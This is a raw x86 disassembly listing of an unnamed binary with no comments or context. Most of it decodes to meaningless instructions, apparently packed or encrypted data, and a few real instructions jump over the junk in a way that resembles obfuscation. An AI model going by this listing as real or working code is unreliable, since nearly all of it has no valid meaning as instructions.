  4090f7:	outs   dx,BYTE PTR ds:[esi]
  4090f8:	add    DWORD PTR [esi+0x4277f08],ebp
  4090fe:	pusha  
  4090ff:	inc    ebp
  409100:	xor    edi,ebx
  409102:	add    DWORD PTR [ebx-0x16ba153b],eax
  409108:	retf   0x895b
  40910b:	add    eax,0x6b2709a2
  409110:	mov    DWORD PTR [edx],esp
  409112:	or     al,0xb
  409114:	imul   esp,DWORD PTR [edi-0x27],0xc
  409118:	mov    al,ds:0xd21fa4a
  40911d:	ret    
  40911e:	cmp    BYTE PTR [edx+ebp*8-0x7],bl
  409122:	std    
  409123:	inc    ebp
  409124:	int    0x15
  409126:	xchg   ebp,eax
  409127:	int    0xf5
  409129:	out    dx,eax
  40912a:	stos   BYTE PTR es:[edi],al
  40912b:	adc    edi,0xb0b5712a
  409131:	std    
  409132:	sar    DWORD PTR [edx-0x2c],1
  409135:	mov    ds:0x22c27f70,eax
  40913a:	pop    edx
  40913b:	hlt    
  40913c:	pop    ss
  40913d:	mov    dl,0x39
  40913f:	retf   
  409140:	jb     0x409135
  409142:	push   ss
  409143:	dec    esp
  409144:	out    dx,al
  409145:	inc    esp
  409146:	xchg   edi,eax
  409147:	mov    DWORD PTR [edx-0x65],esp
  40914a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40914b:	xchg   BYTE PTR [ebp-0x1182f210],bl
  409151:	mov    ch,0x3f
  409153:	shr    DWORD PTR [ebx-0x5f],1
  409156:	cdq    
  409157:	ret    0x2913
  40915a:	mov    esi,0xbdd598ec
  40915f:	adc    bh,al
  409161:	inc    eax
  409162:	fcomp  DWORD PTR [ebp-0x504f0b5b]
  409168:	push   ss
  409169:	adc    al,0x8f
  40916b:	imul   edi,DWORD PTR [ebp+0x39],0xffffffcb
  40916f:	in     al,dx
  409170:	(bad)  
  409172:	(bad)  
  409173:	pop    eax
  409174:	jecxz  0x409190
  409176:	lock mov cl,0xab
  409179:	int    0x8a
  40917b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40917c:	mov    ch,0xb5
  40917e:	add    eax,DWORD PTR [esi]
  409180:	test   al,0x21
  409182:	and    al,0x33
  409184:	mov    ah,0x84
  409186:	ret    0x6791
  409189:	xchg   ebx,eax
  40918a:	mov    esi,0x529f69bb
  40918f:	call   0x525470a2
  409194:	icebp  
  409195:	sub    al,0xf7
  409197:	imul   eax,DWORD PTR [edx-0x11],0x42f9f229
  40919e:	(bad)  
  40919f:	retf   
  4091a0:	shr    DWORD PTR [eax],0xbc
  4091a3:	ds mov cl,0x4
  4091a6:	repz mov ds:0x2b4a31b,al
  4091ac:	lods   al,BYTE PTR ds:[esi]
  4091ad:	in     eax,dx
  4091ae:	xchg   ecx,eax
  4091af:	nop
  4091b0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4091b1:	repz inc ebp
  4091b3:	mov    edx,DWORD PTR [esi]
  4091b5:	(bad)  
  4091b6:	out    dx,al
  4091b7:	jno    0x409215
  4091b9:	cmp    al,0xfd
  4091bb:	mov    bh,0x8
  4091bd:	mov    ebp,0xa3c7d255
  4091c2:	dec    ebp
  4091c3:	jns    0x4091f1
  4091c5:	popf   
  4091c6:	aad    0x68
  4091c8:	inc    ecx
  4091c9:	dec    esi
  4091ca:	sub    al,0xd4
  4091cc:	into   
  4091cd:	shl    BYTE PTR [ebx],cl
  4091cf:	cld    
  4091d0:	fs call 0xa4904020
  4091d6:	add    al,0x4e
  4091d8:	fadd   DWORD PTR [eax-0x6d]
  4091db:	mov    ecx,0x21f4cb85
  4091e0:	sub    eax,0xa926db5e
  4091e5:	ror    BYTE PTR [ecx],0x92
  4091e8:	or     DWORD PTR ds:0xddd91678,0xffffffe9
  4091ef:	mov    dh,0xe8
  4091f1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4091f2:	push   0xffffffda
  4091f4:	mov    ecx,0x3ae483c6
  4091f9:	outs   dx,DWORD PTR ds:[esi]
  4091fa:	arpl   WORD PTR [edx-0x74be4768],ax
  409200:	stc    
  409201:	pop    esi
  409202:	and    DWORD PTR [ebp+0x6a],0x3e
  409206:	or     DWORD PTR [edx-0x3199b696],ecx
  40920c:	jb     0x409195
  40920e:	mov    DWORD PTR [ebp-0x46460e52],esp
  409214:	mov    ebx,0xdcf60897
  409219:	sbb    BYTE PTR [eax],0xe7
  40921c:	mov    ss,WORD PTR [edx]
  40921e:	add    esp,DWORD PTR [eax]
  409220:	cdq    
  409221:	enter  0xd7de,0x29
  409225:	ss and eax,0xac20a3ab
  40922b:	and    DWORD PTR [eax-0x1c],esp
  40922e:	loopne 0x409281
  409230:	or     DWORD PTR [edi-0x3d],0xc0ebdb8c
  409237:	xor    al,0x90
  409239:	stc    
  40923a:	lahf   
  40923b:	xlat   BYTE PTR ds:[ebx]
  40923c:	jo     0x409283
  40923e:	xchg   ebp,eax
  40923f:	jmp    0x4092ba
  409241:	pop    ebp
  409242:	jno    0x409253
  409244:	dec    edi
  409245:	xlat   BYTE PTR ds:[ebx]
  409246:	dec    ebx
  409247:	shl    ah,1
  409249:	ss data16 loopne 0x409281
  40924d:	adc    eax,0x85b8c808
  409252:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409253:	dec    ebp
  409254:	retf   
  409255:	xchg   DWORD PTR [eax-0xf35a72d],eax
  40925b:	jle    0x409268
  40925d:	adc    al,0x28
  40925f:	test   al,0x70
  409261:	enter  0xf2f6,0x70
  409265:	xor    BYTE PTR [edi-0x2],0xba
  409269:	or     cl,dh
  40926b:	into   
  40926c:	mov    esi,0xd475b193
  409271:	jmp    0x2843:0xe893669f
  409278:	sar    BYTE PTR [ebx],1
  40927a:	or     ah,dh
  40927c:	xchg   ebp,eax
  40927d:	sub    eax,edx
  40927f:	and    al,0x86
  409281:	pushf  
  409282:	mov    DWORD PTR [eax-0x40],ecx
  409285:	arpl   WORD PTR [ebx+0x3d6befa7],bx
  40928b:	imul   ebp,DWORD PTR [ebx-0x5d],0x12
  40928f:	and    ch,BYTE PTR [ebx+0x60f63e01]
  409295:	push   edx
  409296:	cmp    al,0xfa
  409298:	sbb    cl,BYTE PTR [ecx-0x2e]
  40929b:	(bad)  
  40929d:	shl    DWORD PTR [edi+0x56374d36],1
  4092a3:	xchg   esi,eax
  4092a4:	loope  0x40931e
  4092a6:	cli    
  4092a7:	cdq    
  4092a8:	call   0x866c:0xf376ec30
  4092af:	dec    ecx
  4092b0:	or     dh,BYTE PTR [esi-0x22]
  4092b3:	mov    al,ds:0x4ec97819
  4092b8:	sub    BYTE PTR [ecx+0x50],0x42
  4092bc:	dec    ecx
  4092bd:	mov    edx,0x8e3e48a9
  4092c2:	pusha  
  4092c3:	push   esp
  4092c4:	in     al,0x80
  4092c6:	pop    ds
  4092c7:	mov    ebx,DWORD PTR [edx+0x4d801fe0]
  4092cd:	mov    ds,WORD PTR [ebx-0x2f]
  4092d0:	cmp    eax,0xe80c6903
  4092d5:	outs   dx,BYTE PTR ds:[esi]
  4092d6:	call   0x66cf:0x9a9cfef
  4092dd:	out    0x45,eax
  4092df:	jns    0x409288
  4092e1:	ret    0xe426
  4092e4:	xchg   esp,eax
  4092e5:	sbb    DWORD PTR [ecx+0x75],ecx
  4092e8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4092e9:	or     BYTE PTR [edx],0x33
  4092ec:	inc    ebp
  4092ed:	out    0x5f,al
  4092ef:	das    
  4092f0:	push   ds
  4092f1:	xor    eax,0xa910dfcc
  4092f6:	sub    DWORD PTR [esi+0x7dc83d54],ebp
  4092fc:	mov    BYTE PTR [edi],dh
  4092fe:	test   eax,0x30ff96ad
  409303:	lea    eax,ds:0x41b260
  409309:	push   DWORD PTR [eax]
  40930b:	lea    eax,ds:0x41b344
  409311:	push   DWORD PTR [eax]
  409313:	xchg   ebx,edx
  409315:	inc    ebx
  409316:	inc    ebx
  409317:	sub    ebx,0x3
  40931a:	push   ebx
  40931b:	pop    eax
  40931c:	jmp    0x409669
  409321:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409322:	jnp    0x409329
  409324:	or     DWORD PTR [ecx+0x52b3b211],esp
  40932a:	lahf   
  40932b:	jo     0x4092ae
  40932d:	add    BYTE PTR [ebp-0x59],ch
  409330:	mov    fs,WORD PTR [edi]
  409332:	loop   0x4093a4
  409334:	jo     0x409356
  409336:	jge    0x4093a8
  409338:	jo     0x409351
  40933a:	pop    eax
  40933b:	xchg   eax,eax
  40933d:	add    bh,BYTE PTR [esi+0xf41a2d9]
  409343:	pushf  
  409344:	jbe    0x409329
  409346:	mov    ds:0x6ea3b485,eax
  40934b:	clc    
  40934c:	retf   0x799c
  40934f:	push   esi
  409350:	and    eax,0xc4ffab8d
  409355:	lock inc ecx
  409357:	loope  0x40936b
  409359:	push   0x98efd9ab
  40935e:	xlat   BYTE PTR ds:[ebx]
  40935f:	mov    dh,0x88
  409361:	mov    eax,ds:0x354e7955
  409366:	mov    ebp,0x20ac4a54
  40936b:	cmp    dh,ch
  40936d:	xor    edi,ecx
  40936f:	push   0xffffffe3
  409371:	out    dx,al
  409372:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409373:	test   esi,eax
  409375:	mov    BYTE PTR [ebx],ah
  409377:	jb     0x409319
  409379:	dec    esi
  40937a:	bound  ebp,QWORD PTR [ebx]
  40937c:	xchg   esp,eax
  40937d:	cwde   
  40937e:	xchg   edi,eax
  40937f:	or     DWORD PTR [eax+eax*1-0x59],edi
  409383:	or     DWORD PTR ds:0xc8fd48d3,edi
  409389:	in     eax,dx
  40938a:	retf   0xf2d3
  40938d:	jecxz  0x409391
  40938f:	inc    eax
  409390:	lahf   
  409391:	ror    al,1
  409393:	(bad)  
  409394:	jp     0x4093b4
  409396:	cld    
  409397:	lods   eax,DWORD PTR ds:[esi]
  409398:	push   esi
  409399:	or     bl,cl
  40939b:	dec    esp
  40939c:	daa    
  40939d:	pop    eax
  40939e:	bound  ecx,QWORD PTR [esi]
  4093a0:	push   eax
  4093a1:	sbb    bh,BYTE PTR [edi+0x42]
  4093a4:	mov    bl,BYTE PTR [ecx]
  4093a6:	inc    esi
  4093a7:	mov    eax,ds:0x32659bfe
  4093ac:	ds mov edi,0x7258e558
  4093b2:	into   
  4093b3:	mov    ?,WORD PTR [esi-0x54]
  4093b6:	dec    ebx
  4093b7:	popa   
  4093b8:	rcl    BYTE PTR [ebx],cl
  4093ba:	sbb    ah,BYTE PTR [ebp-0x33]
  4093bd:	aas    
  4093be:	int    0x39
  4093c0:	in     al,0x1c
  4093c2:	jecxz  0x4093b1
  4093c4:	xor    eax,0x6b78e041
  4093c9:	out    0x5d,eax
  4093cb:	fld    TBYTE PTR [ebp-0x11]
  4093ce:	or     BYTE PTR [ebp+0x27bdcf71],0x48
  4093d5:	mov    bl,0xb3
  4093d7:	inc    ecx
  4093d8:	xor    edx,DWORD PTR [eax]
  4093da:	mov    cl,0x6a
  4093dc:	shr    DWORD PTR [edx+0x19b600c5],0xfb
  4093e3:	xchg   edi,eax
  4093e4:	and    edi,DWORD PTR [edx]
  4093e6:	mov    ch,0xb
  4093e8:	jnp    0x40941a
  4093ea:	sbb    BYTE PTR [ebx],bl
  4093ec:	repnz pop esp
  4093ee:	hlt    
  4093ef:	mov    ecx,0x37837edf
  4093f4:	fcom   QWORD PTR [ebx+0x7cb4b59d]
  4093fa:	fsubr  QWORD PTR es:[ebx+0x889042f]
  409401:	pop    es
  409402:	int    0x95
  409404:	dec    esp
  409405:	cdq    
  409406:	test   eax,0xc088afae
  40940b:	jno    0x40942b
  40940d:	fidiv  WORD PTR ss:[edx]
  409410:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409411:	adc    al,0x6a
  409413:	inc    edx
  409414:	sbb    DWORD PTR [eax+0xa40c2e],ebp
  40941a:	dec    esi
  40941b:	pop    es
  40941c:	bound  ebp,QWORD PTR [edx-0x7c7c9f40]
  409422:	mov    ah,0x71
  409424:	(bad)  
  409425:	mov    dh,0x78
  409427:	push   0xffffff97
  409429:	out    0x6,al
  40942b:	dec    esp
  40942c:	(bad)  
  40942d:	test   BYTE PTR [esi+eiz*2],0x9f
  409431:	jle    0x4093bb
  409433:	mov    ecx,0x1f81b63e
  409438:	inc    esp
  409439:	fwait
  40943a:	aas    
  40943b:	mov    edx,DWORD PTR [ebx-0x5fc9d900]
  409441:	sti    
  409442:	jg     0x409460
  409444:	push   esp
  409445:	pop    ds
  409446:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409447:	scas   al,BYTE PTR es:[edi]
  409448:	ins    DWORD PTR es:[edi],dx
  409449:	mov    bl,0x9a
  40944b:	pop    esi
  40944c:	in     al,0x92
  40944e:	mov    ah,0x34
  409450:	dec    esp
  409451:	sbb    BYTE PTR [edi+0x57],dl
  409454:	and    eax,0xde7af660
  409459:	jne    0x4093db
  40945b:	dec    esp
  40945c:	(bad)  
  40945d:	in     eax,0x7a
  40945f:	push   eax
  409460:	aam    0x48
  409462:	test   BYTE PTR [eax+0xe612e9e],ah
  409468:	adc    BYTE PTR [esi-0x7d0964ba],cl
  40946e:	xor    edi,DWORD PTR [edi]
  409470:	pop    esi
  409471:	and    edx,edi
  409473:	xor    eax,0x33af12b9
  409478:	cmc    
  409479:	push   edx
  40947a:	dec    ebx
  40947b:	jp     0x40940c
  40947d:	jle    0x40942b
  40947f:	stos   DWORD PTR es:[edi],eax
  409480:	xchg   esp,eax
  409481:	imul   esi,DWORD PTR [edx],0xfffffff2
  409484:	mov    ch,0x7e
  409486:	daa    
  409487:	xor    eax,0x9a5e19c8
  40948c:	or     DWORD PTR [esi+0x73aaa788],esi
  409492:	popa   
  409493:	mov    WORD PTR [ecx],ss
  409495:	add    al,0x33
  409497:	xchg   edx,eax
  409498:	inc    ecx
  409499:	outs   dx,DWORD PTR ds:[esi]
  40949a:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40949c:	xchg   ebx,eax
  40949d:	sub    esp,0x234a9183
  4094a3:	sar    BYTE PTR [eax+0x4f],cl
  4094a6:	(bad)  
  4094a7:	call   0x5d69:0x6b1aa10c
  4094ae:	leave  
  4094af:	xor    edi,DWORD PTR [esi-0x1bbecfc]
  4094b5:	out    dx,eax
  4094b6:	loope  0x4094db
  4094b8:	ss jp  0x409464
  4094bb:	jge    0x409464
  4094bd:	fld    TBYTE PTR [edi]
  4094bf:	jle    0x40950d
  4094c1:	sbb    BYTE PTR [ecx],cl
  4094c3:	scas   al,BYTE PTR es:[edi]
  4094c4:	fistp  QWORD PTR [ecx-0x40]
  4094c7:	fcmovnu st,st(6)
  4094c9:	ret    0xe974
  4094cc:	or     BYTE PTR [esi+0x399ea1bb],bl
  4094d2:	std    
  4094d3:	in     eax,dx
  4094d4:	inc    ebx
  4094d5:	mov    ah,0x28
  4094d7:	xor    al,0x2f
  4094d9:	mov    ecx,0x861b862
  4094de:	and    edi,ebp
  4094e0:	fucomi st,st(7)
  4094e2:	xchg   esp,eax
  4094e3:	mov    ebp,0x99c14efd
  4094e8:	lds    edi,FWORD PTR [ebp-0x58bdfbdb]
  4094ee:	(bad)  
  4094ef:	outs   dx,DWORD PTR ds:[esi]
  4094f0:	mov    ebp,0x37581223
  4094f5:	stos   BYTE PTR es:[edi],al
  4094f6:	sub    bl,al
  4094f8:	imul   eax,DWORD PTR [eax+0x11],0xffffff83
  4094fc:	push   es
  4094fd:	xor    BYTE PTR [ecx+0x12],bh
  409500:	(bad)  
  409501:	adc    eax,0x1dcc94a5
  409506:	popf   
  409507:	imul   eax,DWORD PTR [ebp+0x79],0xa
  40950b:	scas   al,BYTE PTR es:[edi]
  40950c:	push   ebx
  40950d:	aaa    
  40950e:	and    edi,edi
  409510:	loope  0x409591
  409512:	leave  
  409513:	xchg   ebx,eax
  409514:	pop    edi
  409515:	les    edx,FWORD PTR [ebp-0x446e317f]
  40951b:	ficomp DWORD PTR [ebp*8+0x3620a12b]
  409522:	test   BYTE PTR [ebp+0x3a2f5401],ch
  409528:	cdq    
  409529:	in     eax,0x30
  40952b:	lahf   
  40952c:	and    eax,0x49d01f5e
  409531:	sbb    edx,ebx
  409533:	adc    al,0x4e
  409535:	push   ebx
  409536:	and    al,0x2c
  409538:	mov    ebx,0x46df5014
  40953d:	sbb    BYTE PTR [esi+ecx*8],ch
  409540:	inc    esi
  409541:	sar    BYTE PTR [ecx-0x1495d72b],0xb7
  409548:	retf   
  409549:	or     dh,BYTE PTR [ebp+edx*1-0x35]
  40954d:	aas    
  40954e:	xchg   esp,eax
  40954f:	mov    bh,0x8d
  409551:	cmp    al,0xa
  409553:	lock in al,0x83
  409556:	adc    DWORD PTR [eax],edi
  409558:	mov    ecx,0x5c25fdf6
  40955d:	ror    bl,cl
  40955f:	or     ecx,esi
  409561:	fist   WORD PTR [edx+0x4f]
  409564:	fimul  WORD PTR ds:0x79bae873
  40956a:	(bad)  
  40956b:	nop
  40956c:	in     eax,0xc9
  40956e:	das    
  40956f:	fiadd  WORD PTR [ebx+edi*1]
  409572:	mov    WORD PTR [edx+edx*4],es
  409575:	or     DWORD PTR [esp+0x59fb1882],ebp
  40957c:	mov    ss,WORD PTR [edx-0x2c6d38b3]
  409582:	jae    0x4095e3
  409584:	and    eax,0x6241e979
  409589:	jl     0x4095fc
  40958b:	inc    edi
  40958c:	inc    DWORD PTR [eax+0x3f98c67b]
  409592:	leave  
  409593:	test   DWORD PTR [ecx-0x4a],ecx
  409596:	scas   al,BYTE PTR es:[edi]
  409597:	push   cs
  409598:	pop    ebp
  409599:	xor    BYTE PTR [esi-0x61],ah
  40959c:	xlat   BYTE PTR ds:[ebx]
  40959d:	ret    
  40959e:	popf   
  40959f:	dec    edx
  4095a0:	jmp    0xb0d2d841
  4095a5:	rdmsr  
  4095a7:	adc    dh,dh
  4095a9:	scas   eax,DWORD PTR es:[edi]
  4095aa:	addr16 js 0x409573
  4095ad:	cmp    al,0x18
  4095af:	add    DWORD PTR [ebp-0x17],edi
  4095b2:	(bad)  
  4095b3:	lahf   
  4095b4:	daa    
  4095b5:	pusha  
  4095b6:	or     ebp,DWORD PTR [esp+edi*1]
  4095b9:	test   dl,0x3f
  4095bc:	ins    DWORD PTR es:[edi],dx
  4095bd:	jmp    0x90d136c0
  4095c2:	mov    dh,0x41
  4095c4:	xor    dh,bh
  4095c6:	jl     0x4095f0
  4095c8:	mov    ch,0xff
  4095ca:	in     al,0xee
  4095cc:	and    esp,DWORD PTR [edi+0x45]
  4095cf:	(bad)  
  4095d0:	cmc    
  4095d1:	aaa    
  4095d2:	inc    esi
  4095d3:	inc    edx
  4095d4:	rcl    DWORD PTR [edx+0x628f489e],1
  4095da:	jecxz  0x4095e2
  4095dc:	pop    es
  4095dd:	mov    ds,WORD PTR [edx]
  4095df:	fstp   DWORD PTR [ebx-0x78ee4e5d]
  4095e5:	ret    0x9cd2
  4095e8:	adc    eax,0x57638c7a
  4095ed:	inc    ebp
  4095ee:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4095ef:	xchg   ebx,eax
  4095f0:	xchg   esi,eax
  4095f1:	pop    edi
  4095f2:	jmp    0xc1d49992
  4095f7:	mov    eax,0x4f8266f0
  4095fc:	xchg   DWORD PTR [ecx],eax
  4095fe:	mov    eax,0x7eff48ba
  409603:	jo     0x409646
  409605:	lock dec esp
  409607:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409608:	sbb    esp,DWORD PTR [esi-0x6109dd2f]
  40960e:	push   ebp
  40960f:	or     ebx,DWORD PTR [ecx-0x8c95ff3]
  409615:	lds    ebp,FWORD PTR [esi-0x5b]
  409618:	fwait
  409619:	sbb    al,0x70
  40961b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40961c:	shr    dl,cl
  40961e:	sbb    al,BYTE PTR [eax+0x2f]
  409621:	std    
  409622:	xor    al,0x59
  409624:	adc    al,0x77
  409626:	sbb    cl,BYTE PTR [eax-0x25]
  409629:	xchg   esp,eax
  40962a:	data16 lahf 
  40962c:	int    0xf6
  40962e:	addr16 aam 0x90
  409631:	and    eax,0xbdd6fe88
  409636:	js     0x4095cc
  409638:	iret   
  409639:	sub    dl,BYTE PTR [edx-0x7d]
  40963c:	sub    esi,DWORD PTR ds:0x1d14805e
  409642:	mov    cl,0x70
  409644:	bound  esp,QWORD PTR [eax+0x623e0146]
  40964a:	xchg   edx,eax
  40964b:	call   0x655f:0x5faff457
  409652:	inc    ecx
  409653:	mov    ch,0xfc
  409655:	push   es
  409656:	push   edi
  409657:	adc    al,0x47
  409659:	xchg   ebp,eax
  40965a:	pop    ecx
  40965b:	xchg   ebx,eax
  40965c:	test   edx,edi
  40965e:	jo     0x4096a4
  409660:	les    eax,FWORD PTR [esi]
  409662:	call   0x3ba3:0x915dd2c4
  409669:	call   DWORD PTR [eax+0x1]
  40966c:	mov    eax,DWORD PTR [ebp-0x20]
  40966f:	mov    ecx,DWORD PTR ds:0x41b224
  409675:	jmp    0x4099c2
  40967a:	out    dx,eax
  40967b:	mov    ebx,0xd169d149
  409680:	ja     0x4096e3
  409682:	add    BYTE PTR [edi+0x44],bh
  409685:	xchg   edi,ebp
  409687:	mov    edx,0xefd73af8
  40968c:	jo     0x4096fe
  40968e:	and    BYTE PTR [ebp+0x70],bh
  409691:	jo     0x4096f0
  409693:	dec    ebx
  409694:	mov    ah,0xd0
  409696:	inc    edi
  409697:	lods   eax,DWORD PTR ds:[esi]
  409698:	sbb    eax,0xb7ab95a
  40969d:	retf   
  40969e:	outs   dx,DWORD PTR ds:[esi]
  40969f:	sub    ah,BYTE PTR [edx+0x473b78b3]
  4096a5:	adc    al,bl
  4096a7:	mov    al,0x4e
  4096a9:	cmp    DWORD PTR [eax],0x7d
  4096ac:	je     0x40966e
  4096ae:	(bad)  
  4096af:	mov    bh,0xbd
  4096b1:	into   
  4096b2:	pushf  
  4096b3:	xor    edi,DWORD PTR [esi]
  4096b5:	shr    BYTE PTR [ebp+edx*1-0x3c029a70],cl
  4096bc:	sar    BYTE PTR [ebx-0x31],1
  4096bf:	cwde   
  4096c0:	sub    bl,bh
  4096c2:	repz mov ds:0xf8057ba9,al
  4096c8:	repnz (bad) 
  4096ca:	sub    al,0xa4
  4096cc:	mov    edi,0x52caf88e
  4096d1:	sub    esp,edx
  4096d3:	daa    
  4096d4:	imul   ebx,ecx,0x27a5b10d
  4096da:	jb     0x40967c
  4096dc:	push   esi
  4096dd:	sbb    BYTE PTR [ebx-0x1e8dd533],ch
  4096e3:	arpl   WORD PTR [eax-0x7f1b3f2f],sp
  4096e9:	sbb    ebp,DWORD PTR [edi+0x6eec314c]
  4096ef:	and    DWORD PTR [ecx-0x16],esp
  4096f2:	adc    al,0x80
  4096f4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4096f5:	sahf   
  4096f6:	jb     0x4096af
  4096f8:	clc    
  4096f9:	ins    DWORD PTR es:[edi],dx
  4096fa:	nop
  4096fb:	neg    BYTE PTR [eax+ecx*2+0x3e2ae449]
  409702:	xchg   ebx,eax
  409703:	hlt    
  409704:	leave  
  409705:	mov    eax,ds:0x5f36b509
  40970a:	call   0x7f20:0x4ce24d6e
  409711:	push   0xffffffde
  409713:	lods   eax,DWORD PTR ds:[esi]
  409714:	jecxz  0x409756
  409716:	mov    ch,al
  409718:	add    esi,DWORD PTR [ebx+0x51]
  40971b:	xor    BYTE PTR [esi+0x66664514],dl
  409721:	sbb    eax,0xc663782c
  409726:	jb     0x4096db
  409728:	call   0x1618bd1d
  40972d:	cwde   
  40972e:	sbb    BYTE PTR [edi+0x2c],0x62
  409732:	call   0x5ea3fd8f
  409737:	xchg   esi,eax
  409738:	ss (bad) 
  40973a:	sahf   
  40973b:	aas    
  40973c:	mov    al,ds:0x2788a091
  409741:	cmp    bh,BYTE PTR [eax-0x63]
  409744:	scas   eax,DWORD PTR es:[edi]
  409745:	test   eax,0xcd9d26a5
  40974a:	xchg   DWORD PTR [esi+0x44d1a52d],eax
  409750:	dec    esi
  409751:	xchg   edi,eax
  409752:	outs   dx,BYTE PTR ds:[esi]
  409753:	mov    ds,edx
  409755:	mov    dl,dh
  409757:	inc    ebp
  409759:	sbb    eax,0xc0c68afd
  40975e:	or     BYTE PTR [ecx],0x3a
  409761:	jecxz  0x4097ac
  409763:	adc    ah,cl
  409765:	mov    esi,0xef13c9c3
  40976a:	wrmsr  
  40976c:	ins    DWORD PTR es:[edi],dx
  40976d:	rcl    bh,1
  40976f:	pushf  
  409770:	add    cl,BYTE PTR [eax-0x269dd045]
  409776:	fcom   QWORD PTR [esi]
  409778:	iret   
  409779:	clc    
  40977a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40977b:	adc    esi,DWORD PTR [ecx+0x2a8b565b]
  409781:	inc    esp
  409782:	dec    ecx
  409783:	fs adc al,0x76
  409786:	test   DWORD PTR [ecx-0x4a777e55],0x6c58d19e
  409790:	xchg   esp,eax
  409791:	pop    ecx
  409792:	(bad)  
  409794:	loopne 0x409720
  409796:	adc    BYTE PTR [edi-0x12],al
  409799:	pop    ss
  40979a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40979b:	jno    0x409755
  40979d:	and    dl,bh
  40979f:	ja     0x40978f
  4097a1:	shr    DWORD PTR [ebx-0x17d86ad1],cl
  4097a7:	push   esp
  4097a8:	fnsave [esi+ebx*2-0xffa1da8]
  4097af:	addr16 pop ss
  4097b1:	loop   0x4097a0
  4097b3:	loopne 0x409738
  4097b5:	xor    DWORD PTR [esi-0x77],ebp
  4097b8:	sti    
  4097b9:	jb     0x40974d
  4097bb:	xchg   ebx,eax
  4097bc:	xlat   BYTE PTR ds:[ebx]
  4097bd:	lods   al,BYTE PTR ds:[esi]
  4097be:	ins    BYTE PTR es:[edi],dx
  4097bf:	data16 jns 0x40974e
  4097c2:	mov    gs,WORD PTR cs:[edx-0x4a8ed9ab]
  4097c9:	mov    WORD PTR [edx],ds
  4097cb:	sbb    al,0x6
  4097cd:	jmp    0x6b37a032
  4097d2:	repnz fwait
  4097d4:	pop    ss
  4097d5:	test   BYTE PTR [ebx+0x4],ch
  4097d8:	push   ecx
  4097d9:	and    al,0xd9
  4097db:	sbb    ah,BYTE PTR [eax+0x56]
  4097de:	cmp    esp,DWORD PTR [eax+ebp*8-0x4ebe69f]
  4097e5:	push   edx
  4097e6:	cld    
  4097e7:	cmp    ch,BYTE PTR [ebx+0x46]
  4097ea:	sahf   
  4097eb:	mov    DWORD PTR [ecx+ecx*4],edi
  4097ee:	sbb    esp,ebp
  4097f0:	sbb    BYTE PTR [edi-0x6526304f],dh
  4097f6:	test   BYTE PTR [ebx-0x3],dl
  4097f9:	in     al,0x58
  4097fb:	test   al,0xc6
  4097fd:	test   al,0x3e
  4097ff:	jnp    0x409808
  409801:	lock das 
  409803:	jge    0x4097e5
  409805:	int3   
  409806:	pop    ss
  409807:	jb     0x4097f3
  409809:	cmp    eax,0xb0f7266f
  40980e:	pop    edx
  40980f:	pandn  mm6,QWORD PTR [edx]
  409812:	mov    al,ds:0x94165b27
  409817:	cmp    DWORD PTR [ebx+0x6a],esp
  40981a:	cs jmp 0x2893bfb3
  409820:	or     al,0xff
  409822:	ss mov gs:0x4151b568,eax
  409829:	iret   
  40982a:	add    ah,BYTE PTR [edi+ebp*8-0x6]
  40982e:	and    eax,0x50f89a44
  409833:	pop    ebp
  409834:	mov    esp,0x467ca68d
  409839:	loop   0x409825
  40983b:	push   ecx
  40983c:	mov    ah,0xc3
  40983e:	push   edi
  40983f:	mov    ebx,0x69a9214e
  409844:	call   0xb70feed1
  409849:	stc    
  40984a:	nop
  40984b:	rcr    BYTE PTR [esi],0x40
  40984e:	into   
  40984f:	ins    BYTE PTR es:[edi],dx
  409850:	xor    ebx,DWORD PTR gs:[eax-0x66]
  409854:	pop    ss
  409855:	xchg   edx,eax
  409856:	mov    BYTE PTR ds:0x90a4e431,bl
  40985c:	and    eax,0x68e3424a
  409861:	outs   dx,DWORD PTR ds:[esi]
  409862:	sbb    BYTE PTR [edi],bh
  409864:	add    al,0x24
  409866:	push   eax
  409867:	xchg   ecx,eax
  409868:	xlat   BYTE PTR ds:[ebx]
  409869:	jne    0x409885
  40986b:	xchg   al,al
  40986d:	inc    edx
  40986e:	mov    ss,WORD PTR [ecx]
  409870:	lahf   
  409871:	ret    0xc943
  409874:	adc    BYTE PTR ds:0x96113200,dl
  40987a:	add    ah,bl
  40987c:	push   ss
  40987d:	scas   eax,DWORD PTR es:[edi]
  40987e:	retf   0xd6c7
  409881:	push   ecx
  409882:	push   ss
  409883:	cs test ebp,0x93671eef
  40988a:	sbb    DWORD PTR [edx],esp
  40988c:	cmp    al,BYTE PTR [edx-0x67f6e1ed]
  409892:	sub    al,BYTE PTR [eax]
  409894:	fucomi st,st(6)
  409896:	adc    dl,BYTE PTR [edx+0x7f]
  409899:	les    ecx,FWORD PTR [edx]
  40989b:	xor    BYTE PTR [eax],cl
  40989d:	mov    edi,0xdad930a5
  4098a2:	push   ebx
  4098a3:	push   eax
  4098a4:	sub    al,0xd9
  4098a6:	cmp    DWORD PTR [ecx+0x58],esi
  4098a9:	and    ebp,DWORD PTR [edi+0x30bbc74a]
  4098af:	pop    esi
  4098b0:	lods   eax,DWORD PTR ds:[esi]
  4098b1:	mov    bl,0x92
  4098b3:	and    al,BYTE PTR [eax+0x46]
  4098b6:	and    ah,BYTE PTR [ecx]
  4098b8:	jo     0x4098e2
  4098ba:	repz std 
  4098bc:	fadd   QWORD PTR [ecx-0x14]
  4098bf:	mov    cl,0x87
  4098c1:	xchg   edi,eax
  4098c2:	sbb    DWORD PTR [edi+ebp*2-0x352be8fc],eax
